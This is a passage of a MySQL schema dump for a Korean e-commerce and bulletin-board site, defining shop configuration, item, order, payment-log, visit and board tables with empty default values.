  `de_change_content` text NOT NULL,
  `de_point_days` int(11) NOT NULL DEFAULT 0,
  `de_simg_width` int(11) NOT NULL DEFAULT 0,
  `de_simg_height` int(11) NOT NULL DEFAULT 0,
  `de_mimg_width` int(11) NOT NULL DEFAULT 0,
  `de_mimg_height` int(11) NOT NULL DEFAULT 0,
  `de_sms_cont1` text NOT NULL,
  `de_sms_cont2` text NOT NULL,
  `de_sms_cont3` text NOT NULL,
  `de_sms_cont4` text NOT NULL,
  `de_sms_cont5` text NOT NULL,
  `de_sms_use1` tinyint(4) NOT NULL DEFAULT 0,
  `de_sms_use2` tinyint(4) NOT NULL DEFAULT 0,
  `de_sms_use3` tinyint(4) NOT NULL DEFAULT 0,
  `de_sms_use4` tinyint(4) NOT NULL DEFAULT 0,
  `de_sms_use5` tinyint(4) NOT NULL DEFAULT 0,
  `de_sms_hp` varchar(255) NOT NULL DEFAULT '',
  `de_pg_service` varchar(255) NOT NULL DEFAULT '',
  `de_kcp_mid` varchar(255) NOT NULL DEFAULT '',
  `de_kcp_site_key` varchar(255) NOT NULL DEFAULT '',
  `de_inicis_mid` varchar(255) NOT NULL DEFAULT '',
  `de_inicis_iniapi_key` varchar(30) NOT NULL DEFAULT '',
  `de_inicis_iniapi_iv` varchar(30) NOT NULL DEFAULT '',
  `de_inicis_sign_key` varchar(255) NOT NULL DEFAULT '',
  `de_iche_use` tinyint(4) NOT NULL DEFAULT 0,
  `de_easy_pay_use` tinyint(4) NOT NULL DEFAULT 0,
  `de_easy_pay_services` varchar(255) NOT NULL DEFAULT '',
  `de_samsung_pay_use` tinyint(4) NOT NULL DEFAULT 0,
  `de_inicis_lpay_use` tinyint(4) NOT NULL DEFAULT 0,
  `de_inicis_kakaopay_use` tinyint(4) NOT NULL DEFAULT 0,
  `de_inicis_cartpoint_use` tinyint(4) NOT NULL DEFAULT 0,
  `de_item_use_use` tinyint(4) NOT NULL DEFAULT 0,
  `de_item_use_write` tinyint(4) NOT NULL DEFAULT 0,
  `de_code_dup_use` tinyint(4) NOT NULL DEFAULT 0,
  `de_cart_keep_term` int(11) NOT NULL DEFAULT 0,
  `de_guest_cart_use` tinyint(4) NOT NULL DEFAULT 0,
  `de_admin_buga_no` varchar(255) NOT NULL DEFAULT '',
  `de_vbank_use` varchar(255) NOT NULL DEFAULT '',
  `de_taxsave_use` tinyint(4) NOT NULL,
  `de_taxsave_types` set('account','vbank','transfer') NOT NULL DEFAULT 'account',
  `de_guest_privacy` text NOT NULL,
  `de_hp_use` tinyint(4) NOT NULL DEFAULT 0,
  `de_escrow_use` tinyint(4) NOT NULL DEFAULT 0,
  `de_tax_flag_use` tinyint(4) NOT NULL DEFAULT 0,
  `de_kakaopay_mid` varchar(255) NOT NULL DEFAULT '',
  `de_kakaopay_key` varchar(255) NOT NULL DEFAULT '',
  `de_kakaopay_enckey` varchar(255) NOT NULL DEFAULT '',
  `de_kakaopay_hashkey` varchar(255) NOT NULL DEFAULT '',
  `de_kakaopay_cancelpwd` varchar(255) NOT NULL DEFAULT '',
  `de_naverpay_mid` varchar(255) NOT NULL DEFAULT '',
  `de_naverpay_cert_key` varchar(255) NOT NULL DEFAULT '',
  `de_naverpay_button_key` varchar(255) NOT NULL DEFAULT '',
  `de_naverpay_test` tinyint(4) NOT NULL DEFAULT 0,
  `de_naverpay_mb_id` varchar(255) NOT NULL DEFAULT '',
  `de_naverpay_sendcost` varchar(255) NOT NULL DEFAULT '',
  `de_member_reg_coupon_use` tinyint(4) NOT NULL DEFAULT 0,
  `de_member_reg_coupon_term` int(11) NOT NULL DEFAULT 0,
  `de_member_reg_coupon_price` int(11) NOT NULL DEFAULT 0,
  `de_member_reg_coupon_minimum` int(11) NOT NULL DEFAULT 0
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb3 COLLATE=utf8mb3_general_ci;

-- ----------------------------
-- Table structure for g5_shop_event
-- ----------------------------
CREATE TABLE `g5_shop_event` (
  `ev_id` int(11) NOT NULL AUTO_INCREMENT,
  `ev_skin` varchar(255) NOT NULL DEFAULT '',
  `ev_mobile_skin` varchar(255) NOT NULL DEFAULT '',
  `ev_img_width` int(11) NOT NULL DEFAULT 0,
  `ev_img_height` int(11) NOT NULL DEFAULT 0,
  `ev_list_mod` int(11) NOT NULL DEFAULT 0,
  `ev_list_row` int(11) NOT NULL DEFAULT 0,
  `ev_mobile_img_width` int(11) NOT NULL DEFAULT 0,
  `ev_mobile_img_height` int(11) NOT NULL DEFAULT 0,
  `ev_mobile_list_mod` int(11) NOT NULL DEFAULT 0,
  `ev_mobile_list_row` int(11) NOT NULL DEFAULT 0,
  `ev_subject` varchar(255) NOT NULL DEFAULT '',
  `ev_subject_strong` tinyint(4) NOT NULL DEFAULT 0,
  `ev_head_html` text NOT NULL,
  `ev_tail_html` text NOT NULL,
  `ev_use` tinyint(4) NOT NULL DEFAULT 0,
  PRIMARY KEY (`ev_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb3 COLLATE=utf8mb3_general_ci;

-- ----------------------------
-- Table structure for g5_shop_event_item
-- ----------------------------
CREATE TABLE `g5_shop_event_item` (
  `ev_id` int(11) NOT NULL DEFAULT 0,
  `it_id` varchar(20) NOT NULL DEFAULT '',
  PRIMARY KEY (`ev_id`,`it_id`),
  KEY `it_id` (`it_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb3 COLLATE=utf8mb3_general_ci;

-- ----------------------------
-- Table structure for g5_shop_inicis_log
-- ----------------------------
CREATE TABLE `g5_shop_inicis_log` (
  `oid` bigint(20) unsigned NOT NULL,
  `P_TID` varchar(255) NOT NULL DEFAULT '',
  `P_MID` varchar(255) NOT NULL DEFAULT '',
  `P_AUTH_DT` varchar(255) NOT NULL DEFAULT '',
  `P_STATUS` varchar(255) NOT NULL DEFAULT '',
  `P_TYPE` varchar(255) NOT NULL DEFAULT '',
  `P_OID` varchar(255) NOT NULL DEFAULT '',
  `P_FN_NM` varchar(255) NOT NULL DEFAULT '',
  `P_AUTH_NO` varchar(255) NOT NULL DEFAULT '',
  `P_AMT` int(11) NOT NULL DEFAULT 0,
  `P_RMESG1` varchar(255) NOT NULL DEFAULT '',
  `post_data` text NOT NULL,
  `is_mail_send` tinyint(4) NOT NULL DEFAULT 1,
  PRIMARY KEY (`oid`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb3 COLLATE=utf8mb3_general_ci;

-- ----------------------------
-- Table structure for g5_shop_item
-- ----------------------------
CREATE TABLE `g5_shop_item` (
  `it_id` varchar(20) NOT NULL DEFAULT '',
  `ca_id` varchar(10) NOT NULL DEFAULT '0',
  `ca_id2` varchar(255) NOT NULL DEFAULT '',
  `ca_id3` varchar(255) NOT NULL DEFAULT '',
  `it_skin` varchar(255) NOT NULL DEFAULT '',
  `it_mobile_skin` varchar(255) NOT NULL DEFAULT '',
  `it_name` varchar(255) NOT NULL DEFAULT '',
  `it_seo_title` varchar(200) NOT NULL DEFAULT '',
  `it_maker` varchar(255) NOT NULL DEFAULT '',
  `it_origin` varchar(255) NOT NULL DEFAULT '',
  `it_brand` varchar(255) NOT NULL DEFAULT '',
  `it_model` varchar(255) NOT NULL DEFAULT '',
  `it_option_subject` varchar(255) NOT NULL DEFAULT '',
  `it_supply_subject` varchar(255) NOT NULL DEFAULT '',
  `it_type1` tinyint(4) NOT NULL DEFAULT 0,
  `it_type2` tinyint(4) NOT NULL DEFAULT 0,
  `it_type3` tinyint(4) NOT NULL DEFAULT 0,
  `it_type4` tinyint(4) NOT NULL DEFAULT 0,
  `it_type5` tinyint(4) NOT NULL DEFAULT 0,
  `it_basic` text NOT NULL,
  `it_explan` mediumtext NOT NULL,
  `it_explan2` mediumtext NOT NULL,
  `it_mobile_explan` mediumtext NOT NULL,
  `it_cust_price` int(11) NOT NULL DEFAULT 0,
  `it_price` int(11) NOT NULL DEFAULT 0,
  `it_point` int(11) NOT NULL DEFAULT 0,
  `it_point_type` tinyint(4) NOT NULL DEFAULT 0,
  `it_supply_point` int(11) NOT NULL DEFAULT 0,
  `it_notax` tinyint(4) NOT NULL DEFAULT 0,
  `it_sell_email` varchar(255) NOT NULL DEFAULT '',
  `it_use` tinyint(4) NOT NULL DEFAULT 0,
  `it_nocoupon` tinyint(4) NOT NULL DEFAULT 0,
  `it_soldout` tinyint(4) NOT NULL DEFAULT 0,
  `it_stock_qty` int(11) NOT NULL DEFAULT 0,
  `it_stock_sms` tinyint(4) NOT NULL DEFAULT 0,
  `it_noti_qty` int(11) NOT NULL DEFAULT 0,
  `it_sc_type` tinyint(4) NOT NULL DEFAULT 0,
  `it_sc_method` tinyint(4) NOT NULL DEFAULT 0,
  `it_sc_price` int(11) NOT NULL DEFAULT 0,
  `it_sc_minimum` int(11) NOT NULL DEFAULT 0,
  `it_sc_qty` int(11) NOT NULL DEFAULT 0,
  `it_buy_min_qty` int(11) NOT NULL DEFAULT 0,
  `it_buy_max_qty` int(11) NOT NULL DEFAULT 0,
  `it_head_html` text NOT NULL,
  `it_tail_html` text NOT NULL,
  `it_mobile_head_html` text NOT NULL,
  `it_mobile_tail_html` text NOT NULL,
  `it_hit` int(11) NOT NULL DEFAULT 0,
  `it_time` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `it_update_time` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `it_ip` varchar(25) NOT NULL DEFAULT '',
  `it_order` int(11) NOT NULL DEFAULT 0,
  `it_tel_inq` tinyint(4) NOT NULL DEFAULT 0,
  `it_info_gubun` varchar(50) NOT NULL DEFAULT '',
  `it_info_value` text NOT NULL,
  `it_sum_qty` int(11) NOT NULL DEFAULT 0,
  `it_use_cnt` int(11) NOT NULL DEFAULT 0,
  `it_use_avg` decimal(2,1) NOT NULL,
  `it_shop_memo` text NOT NULL,
  `ec_mall_pid` varchar(255) NOT NULL DEFAULT '',
  `it_img1` varchar(255) NOT NULL DEFAULT '',
  `it_img2` varchar(255) NOT NULL DEFAULT '',
  `it_img3` varchar(255) NOT NULL DEFAULT '',
  `it_img4` varchar(255) NOT NULL DEFAULT '',
  `it_img5` varchar(255) NOT NULL DEFAULT '',
  `it_img6` varchar(255) NOT NULL DEFAULT '',
  `it_img7` varchar(255) NOT NULL DEFAULT '',
  `it_img8` varchar(255) NOT NULL DEFAULT '',
  `it_img9` varchar(255) NOT NULL DEFAULT '',
  `it_img10` varchar(255) NOT NULL DEFAULT '',
  `it_1_subj` varchar(255) NOT NULL DEFAULT '',
  `it_2_subj` varchar(255) NOT NULL DEFAULT '',
  `it_3_subj` varchar(255) NOT NULL DEFAULT '',
  `it_4_subj` varchar(255) NOT NULL DEFAULT '',
  `it_5_subj` varchar(255) NOT NULL DEFAULT '',
  `it_6_subj` varchar(255) NOT NULL DEFAULT '',
  `it_7_subj` varchar(255) NOT NULL DEFAULT '',
  `it_8_subj` varchar(255) NOT NULL DEFAULT '',
  `it_9_subj` varchar(255) NOT NULL DEFAULT '',
  `it_10_subj` varchar(255) NOT NULL DEFAULT '',
  `it_1` varchar(255) NOT NULL DEFAULT '',
  `it_2` varchar(255) NOT NULL DEFAULT '',
  `it_3` varchar(255) NOT NULL DEFAULT '',
  `it_4` varchar(255) NOT NULL DEFAULT '',
  `it_5` varchar(255) NOT NULL DEFAULT '',
  `it_6` varchar(255) NOT NULL DEFAULT '',
  `it_7` varchar(255) NOT NULL DEFAULT '',
  `it_8` varchar(255) NOT NULL DEFAULT '',
  `it_9` varchar(255) NOT NULL DEFAULT '',
  `it_10` varchar(255) NOT NULL DEFAULT '',
  PRIMARY KEY (`it_id`),
  KEY `ca_id` (`ca_id`),
  KEY `it_name` (`it_name`),
  KEY `it_seo_title` (`it_seo_title`),
  KEY `it_order` (`it_order`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb3 COLLATE=utf8mb3_general_ci;

-- ----------------------------
-- Table structure for g5_shop_item_option
-- ----------------------------
CREATE TABLE `g5_shop_item_option` (
  `io_no` int(11) NOT NULL AUTO_INCREMENT,
  `io_id` varchar(255) NOT NULL DEFAULT '0',
  `io_type` tinyint(4) NOT NULL DEFAULT 0,
  `it_id` varchar(20) NOT NULL DEFAULT '',
  `io_price` int(11) NOT NULL DEFAULT 0,
  `io_stock_qty` int(11) NOT NULL DEFAULT 0,
  `io_noti_qty` int(11) NOT NULL DEFAULT 0,
  `io_use` tinyint(4) NOT NULL DEFAULT 0,
  PRIMARY KEY (`io_no`),
  KEY `io_id` (`io_id`),
  KEY `it_id` (`it_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb3 COLLATE=utf8mb3_general_ci;

-- ----------------------------
-- Table structure for g5_shop_item_qa
-- ----------------------------
CREATE TABLE `g5_shop_item_qa` (
  `iq_id` int(11) NOT NULL AUTO_INCREMENT,
  `it_id` varchar(20) NOT NULL DEFAULT '',
  `mb_id` varchar(255) NOT NULL DEFAULT '',
  `iq_secret` tinyint(4) NOT NULL DEFAULT 0,
  `iq_name` varchar(255) NOT NULL DEFAULT '',
  `iq_email` varchar(255) NOT NULL DEFAULT '',
  `iq_hp` varchar(255) NOT NULL DEFAULT '',
  `iq_password` varchar(255) NOT NULL DEFAULT '',
  `iq_subject` varchar(255) NOT NULL DEFAULT '',
  `iq_question` text NOT NULL,
  `iq_answer` text NOT NULL,
  `iq_time` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `iq_ip` varchar(25) NOT NULL DEFAULT '',
  PRIMARY KEY (`iq_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb3 COLLATE=utf8mb3_general_ci;

-- ----------------------------
-- Table structure for g5_shop_item_relation
-- ----------------------------
CREATE TABLE `g5_shop_item_relation` (
  `it_id` varchar(20) NOT NULL DEFAULT '',
  `it_id2` varchar(20) NOT NULL DEFAULT '',
  `ir_no` int(11) NOT NULL DEFAULT 0,
  PRIMARY KEY (`it_id`,`it_id2`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb3 COLLATE=utf8mb3_general_ci;

-- ----------------------------
-- Table structure for g5_shop_item_stocksms
-- ----------------------------
CREATE TABLE `g5_shop_item_stocksms` (
  `ss_id` int(11) NOT NULL AUTO_INCREMENT,
  `it_id` varchar(20) NOT NULL DEFAULT '',
  `ss_hp` varchar(255) NOT NULL DEFAULT '',
  `ss_send` tinyint(4) NOT NULL DEFAULT 0,
  `ss_send_time` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `ss_datetime` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `ss_ip` varchar(25) NOT NULL DEFAULT '',
  PRIMARY KEY (`ss_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb3 COLLATE=utf8mb3_general_ci;

-- ----------------------------
-- Table structure for g5_shop_item_use
-- ----------------------------
CREATE TABLE `g5_shop_item_use` (
  `is_id` int(11) NOT NULL AUTO_INCREMENT,
  `it_id` varchar(20) NOT NULL DEFAULT '0',
  `mb_id` varchar(255) NOT NULL DEFAULT '',
  `is_name` varchar(255) NOT NULL DEFAULT '',
  `is_password` varchar(255) NOT NULL DEFAULT '',
  `is_score` tinyint(4) NOT NULL DEFAULT 0,
  `is_subject` varchar(255) NOT NULL DEFAULT '',
  `is_content` text NOT NULL,
  `is_time` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `is_ip` varchar(25) NOT NULL DEFAULT '',
  `is_confirm` tinyint(4) NOT NULL DEFAULT 0,
  PRIMARY KEY (`is_id`),
  KEY `index1` (`it_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb3 COLLATE=utf8mb3_general_ci;

-- ----------------------------
-- Table structure for g5_shop_order
-- ----------------------------
CREATE TABLE `g5_shop_order` (
  `od_id` bigint(20) unsigned NOT NULL,
  `mb_id` varchar(255) NOT NULL DEFAULT '',
  `od_name` varchar(20) NOT NULL DEFAULT '',
  `od_email` varchar(100) NOT NULL DEFAULT '',
  `od_tel` varchar(20) NOT NULL DEFAULT '',
  `od_hp` varchar(20) NOT NULL DEFAULT '',
  `od_zip1` char(3) NOT NULL DEFAULT '',
  `od_zip2` char(3) NOT NULL DEFAULT '',
  `od_addr1` varchar(100) NOT NULL DEFAULT '',
  `od_addr2` varchar(100) NOT NULL DEFAULT '',
  `od_addr3` varchar(255) NOT NULL DEFAULT '',
  `od_addr_jibeon` varchar(255) NOT NULL DEFAULT '',
  `od_deposit_name` varchar(20) NOT NULL DEFAULT '',
  `od_b_name` varchar(20) NOT NULL DEFAULT '',
  `od_b_tel` varchar(20) NOT NULL DEFAULT '',
  `od_b_hp` varchar(20) NOT NULL DEFAULT '',
  `od_b_zip1` char(3) NOT NULL DEFAULT '',
  `od_b_zip2` char(3) NOT NULL DEFAULT '',
  `od_b_addr1` varchar(100) NOT NULL DEFAULT '',
  `od_b_addr2` varchar(100) NOT NULL DEFAULT '',
  `od_b_addr3` varchar(255) NOT NULL DEFAULT '',
  `od_b_addr_jibeon` varchar(255) NOT NULL DEFAULT '',
  `od_memo` text NOT NULL,
  `od_cart_count` int(11) NOT NULL DEFAULT 0,
  `od_cart_price` int(11) NOT NULL DEFAULT 0,
  `od_cart_coupon` int(11) NOT NULL DEFAULT 0,
  `od_send_cost` int(11) NOT NULL DEFAULT 0,
  `od_send_cost2` int(11) NOT NULL DEFAULT 0,
  `od_send_coupon` int(11) NOT NULL DEFAULT 0,
  `od_receipt_price` int(11) NOT NULL DEFAULT 0,
  `od_cancel_price` int(11) NOT NULL DEFAULT 0,
  `od_receipt_point` int(11) NOT NULL DEFAULT 0,
  `od_refund_price` int(11) NOT NULL DEFAULT 0,
  `od_bank_account` varchar(255) NOT NULL DEFAULT '',
  `od_receipt_time` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `od_coupon` int(11) NOT NULL DEFAULT 0,
  `od_misu` int(11) NOT NULL DEFAULT 0,
  `od_shop_memo` text NOT NULL,
  `od_mod_history` text NOT NULL,
  `od_status` varchar(255) NOT NULL DEFAULT '',
  `od_hope_date` date NOT NULL DEFAULT '0000-00-00',
  `od_settle_case` varchar(255) NOT NULL DEFAULT '',
  `od_other_pay_type` varchar(100) NOT NULL DEFAULT '',
  `od_test` tinyint(4) NOT NULL DEFAULT 0,
  `od_mobile` tinyint(4) NOT NULL DEFAULT 0,
  `od_pg` varchar(255) NOT NULL DEFAULT '',
  `od_tno` varchar(255) NOT NULL DEFAULT '',
  `od_app_no` varchar(20) NOT NULL DEFAULT '',
  `od_escrow` tinyint(4) NOT NULL DEFAULT 0,
  `od_casseqno` varchar(255) NOT NULL DEFAULT '',
  `od_tax_flag` tinyint(4) NOT NULL DEFAULT 0,
  `od_tax_mny` int(11) NOT NULL DEFAULT 0,
  `od_vat_mny` int(11) NOT NULL DEFAULT 0,
  `od_free_mny` int(11) NOT NULL DEFAULT 0,
  `od_delivery_company` varchar(255) NOT NULL DEFAULT '0',
  `od_invoice` varchar(255) NOT NULL DEFAULT '',
  `od_invoice_time` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `od_cash` tinyint(4) NOT NULL,
  `od_cash_no` varchar(255) NOT NULL,
  `od_cash_info` text NOT NULL,
  `od_time` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `od_pwd` varchar(255) NOT NULL DEFAULT '',
  `od_ip` varchar(25) NOT NULL DEFAULT '',
  PRIMARY KEY (`od_id`),
  KEY `index2` (`mb_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb3 COLLATE=utf8mb3_general_ci;

-- ----------------------------
-- Table structure for g5_shop_order_address
-- ----------------------------
CREATE TABLE `g5_shop_order_address` (
  `ad_id` int(11) NOT NULL AUTO_INCREMENT,
  `mb_id` varchar(255) NOT NULL DEFAULT '',
  `ad_subject` varchar(255) NOT NULL DEFAULT '',
  `ad_default` tinyint(4) NOT NULL DEFAULT 0,
  `ad_name` varchar(255) NOT NULL DEFAULT '',
  `ad_tel` varchar(255) NOT NULL DEFAULT '',
  `ad_hp` varchar(255) NOT NULL DEFAULT '',
  `ad_zip1` char(3) NOT NULL DEFAULT '',
  `ad_zip2` char(3) NOT NULL DEFAULT '',
  `ad_addr1` varchar(255) NOT NULL DEFAULT '',
  `ad_addr2` varchar(255) NOT NULL DEFAULT '',
  `ad_addr3` varchar(255) NOT NULL DEFAULT '',
  `ad_jibeon` varchar(255) NOT NULL DEFAULT '',
  PRIMARY KEY (`ad_id`),
  KEY `mb_id` (`mb_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb3 COLLATE=utf8mb3_general_ci;

-- ----------------------------
-- Table structure for g5_shop_order_data
-- ----------------------------
CREATE TABLE `g5_shop_order_data` (
  `od_id` bigint(20) unsigned NOT NULL,
  `cart_id` bigint(20) unsigned NOT NULL,
  `mb_id` varchar(20) NOT NULL DEFAULT '',
  `dt_pg` varchar(255) NOT NULL DEFAULT '',
  `dt_data` text NOT NULL,
  `dt_time` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  KEY `od_id` (`od_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb3 COLLATE=utf8mb3_general_ci;

-- ----------------------------
-- Table structure for g5_shop_order_delete
-- ----------------------------
CREATE TABLE `g5_shop_order_delete` (
  `de_id` int(11) NOT NULL AUTO_INCREMENT,
  `de_key` varchar(255) NOT NULL DEFAULT '',
  `de_data` longtext NOT NULL,
  `mb_id` varchar(20) NOT NULL DEFAULT '',
  `de_ip` varchar(255) NOT NULL DEFAULT '',
  `de_datetime` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  PRIMARY KEY (`de_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb3 COLLATE=utf8mb3_general_ci;

-- ----------------------------
-- Table structure for g5_shop_order_post_log
-- ----------------------------
CREATE TABLE `g5_shop_order_post_log` (
  `log_id` int(11) NOT NULL AUTO_INCREMENT,
  `oid` bigint(20) unsigned NOT NULL,
  `mb_id` varchar(255) NOT NULL DEFAULT '',
  `post_data` text NOT NULL,
  `ol_code` varchar(255) NOT NULL DEFAULT '',
  `ol_msg` text NOT NULL,
  `ol_datetime` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `ol_ip` varchar(25) NOT NULL DEFAULT '',
  PRIMARY KEY (`log_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb3 COLLATE=utf8mb3_general_ci;

-- ----------------------------
-- Table structure for g5_shop_personalpay
-- ----------------------------
CREATE TABLE `g5_shop_personalpay` (
  `pp_id` bigint(20) unsigned NOT NULL,
  `od_id` bigint(20) unsigned NOT NULL,
  `pp_name` varchar(255) NOT NULL DEFAULT '',
  `pp_email` varchar(255) NOT NULL DEFAULT '',
  `pp_hp` varchar(255) NOT NULL DEFAULT '',
  `pp_content` text NOT NULL,
  `pp_use` tinyint(4) NOT NULL DEFAULT 0,
  `pp_price` int(11) NOT NULL DEFAULT 0,
  `pp_pg` varchar(255) NOT NULL DEFAULT '',
  `pp_tno` varchar(255) NOT NULL DEFAULT '',
  `pp_app_no` varchar(20) NOT NULL DEFAULT '',
  `pp_casseqno` varchar(255) NOT NULL DEFAULT '',
  `pp_receipt_price` int(11) NOT NULL DEFAULT 0,
  `pp_settle_case` varchar(255) NOT NULL DEFAULT '',
  `pp_bank_account` varchar(255) NOT NULL DEFAULT '',
  `pp_deposit_name` varchar(255) NOT NULL DEFAULT '',
  `pp_receipt_time` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `pp_receipt_ip` varchar(255) NOT NULL DEFAULT '',
  `pp_shop_memo` text NOT NULL,
  `pp_cash` tinyint(4) NOT NULL DEFAULT 0,
  `pp_cash_no` varchar(255) NOT NULL DEFAULT '',
  `pp_cash_info` text NOT NULL,
  `pp_ip` varchar(255) NOT NULL DEFAULT '',
  `pp_time` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  PRIMARY KEY (`pp_id`),
  KEY `od_id` (`od_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb3 COLLATE=utf8mb3_general_ci;

-- ----------------------------
-- Table structure for g5_shop_sendcost
-- ----------------------------
CREATE TABLE `g5_shop_sendcost` (
  `sc_id` int(11) NOT NULL AUTO_INCREMENT,
  `sc_name` varchar(255) NOT NULL DEFAULT '',
  `sc_zip1` varchar(10) NOT NULL DEFAULT '',
  `sc_zip2` varchar(10) NOT NULL DEFAULT '',
  `sc_price` int(11) NOT NULL DEFAULT 0,
  PRIMARY KEY (`sc_id`),
  KEY `sc_zip1` (`sc_zip1`),
  KEY `sc_zip2` (`sc_zip2`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb3 COLLATE=utf8mb3_general_ci;

-- ----------------------------
-- Table structure for g5_shop_wish
-- ----------------------------
CREATE TABLE `g5_shop_wish` (
  `wi_id` int(11) NOT NULL AUTO_INCREMENT,
  `mb_id` varchar(255) NOT NULL DEFAULT '',
  `it_id` varchar(20) NOT NULL DEFAULT '0',
  `wi_time` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `wi_ip` varchar(25) NOT NULL DEFAULT '',
  PRIMARY KEY (`wi_id`),
  KEY `index1` (`mb_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb3 COLLATE=utf8mb3_general_ci;

-- ----------------------------
-- Table structure for g5_uniqid
-- ----------------------------
CREATE TABLE `g5_uniqid` (
  `uq_id` bigint(20) unsigned NOT NULL,
  `uq_ip` varchar(255) NOT NULL,
  PRIMARY KEY (`uq_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb3 COLLATE=utf8mb3_general_ci;

-- ----------------------------
-- Table structure for g5_visit
-- ----------------------------
CREATE TABLE `g5_visit` (
  `vi_id` int(11) NOT NULL DEFAULT 0,
  `vi_ip` varchar(100) NOT NULL DEFAULT '',
  `vi_date` date NOT NULL DEFAULT '0000-00-00',
  `vi_time` time NOT NULL DEFAULT '00:00:00',
  `vi_referer` text NOT NULL,
  `vi_agent` varchar(200) NOT NULL DEFAULT '',
  `vi_browser` varchar(255) NOT NULL DEFAULT '',
  `vi_os` varchar(255) NOT NULL DEFAULT '',
  `vi_device` varchar(255) NOT NULL DEFAULT '',
  PRIMARY KEY (`vi_id`),
  UNIQUE KEY `index1` (`vi_ip`,`vi_date`),
  KEY `index2` (`vi_date`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb3 COLLATE=utf8mb3_general_ci;

-- ----------------------------
-- Table structure for g5_visit_sum
-- ----------------------------
CREATE TABLE `g5_visit_sum` (
  `vs_date` date NOT NULL DEFAULT '0000-00-00',
  `vs_count` int(11) NOT NULL DEFAULT 0,
  PRIMARY KEY (`vs_date`),
  KEY `index1` (`vs_count`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb3 COLLATE=utf8mb3_general_ci;

-- ----------------------------
-- Table structure for g5_write_day
-- ----------------------------
CREATE TABLE `g5_write_day` (
  `wr_id` int(11) NOT NULL AUTO_INCREMENT,
  `wr_num` int(11) NOT NULL DEFAULT 0,
  `wr_reply` varchar(10) NOT NULL,
  `wr_parent` int(11) NOT NULL DEFAULT 0,
  `wr_is_comment` tinyint(4) NOT NULL DEFAULT 0,
  `wr_comment` int(11) NOT NULL DEFAULT 0,
  `wr_comment_reply` varchar(5) NOT NULL,
  `ca_name` varchar(255) NOT NULL,
  `wr_option` set('html1','html2','secret','mail') NOT NULL,
  `wr_subject` varchar(255) NOT NULL,
  `wr_content` text NOT NULL,
  `wr_seo_title` varchar(255) NOT NULL,
  `wr_link1` text NOT NULL,
  `wr_link2` text NOT NULL,
  `wr_link1_hit` int(11) NOT NULL DEFAULT 0,
  `wr_link2_hit` int(11) NOT NULL DEFAULT 0,
  `wr_hit` int(11) NOT NULL DEFAULT 0,
  `wr_good` int(11) NOT NULL DEFAULT 0,
  `wr_nogood` int(11) NOT NULL DEFAULT 0,
  `mb_id` varchar(20) NOT NULL,
  `wr_password` varchar(255) NOT NULL,
  `wr_name` varchar(255) NOT NULL,
  `wr_email` varchar(255) NOT NULL,
  `wr_homepage` varchar(255) NOT NULL,
  `wr_datetime` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `wr_file` tinyint(4) NOT NULL DEFAULT 0,
  `wr_last` varchar(19) NOT NULL,
  `wr_ip` varchar(255) NOT NULL,
  `wr_facebook_user` varchar(255) NOT NULL,
  `wr_twitter_user` varchar(255) NOT NULL,
  `wr_1` datetime NOT NULL DEFAULT '1000-01-01 00:00:00' COMMENT '시작일시',
  `wr_2` datetime NOT NULL DEFAULT '1000-01-01 00:00:00' COMMENT '종료일시',
  `wr_3` varchar(255) NOT NULL,
  `wr_4` varchar(255) NOT NULL,
  `wr_5` varchar(255) NOT NULL,
  `wr_6` varchar(255) NOT NULL,
  `wr_7` varchar(255) NOT NULL,
  `wr_8` varchar(255) NOT NULL,
  `wr_9` varchar(255) NOT NULL,
  `wr_10` varchar(255) NOT NULL,
  PRIMARY KEY (`wr_id`),
  KEY `wr_seo_title` (`wr_seo_title`),
  KEY `wr_num_reply_parent` (`wr_num`,`wr_reply`,`wr_parent`),
  KEY `wr_is_comment` (`wr_is_comment`,`wr_id`)
) ENGINE=InnoDB AUTO_INCREMENT=6 DEFAULT CHARSET=utf8mb3 COLLATE=utf8mb3_general_ci;

-- ----------------------------
-- Table structure for g5_write_gallery
-- ----------------------------
CREATE TABLE `g5_write_gallery` (
  `wr_id` int(11) NOT NULL AUTO_INCREMENT,
  `wr_num` int(11) NOT NULL DEFAULT 0,
  `wr_reply` varchar(10) NOT NULL,
  `wr_parent` int(11) NOT NULL DEFAULT 0,
  `wr_is_comment` tinyint(4) NOT NULL DEFAULT 0,
  `wr_comment` int(11) NOT NULL DEFAULT 0,
  `wr_comment_reply` varchar(5) NOT NULL,
  `ca_name` varchar(255) NOT NULL,
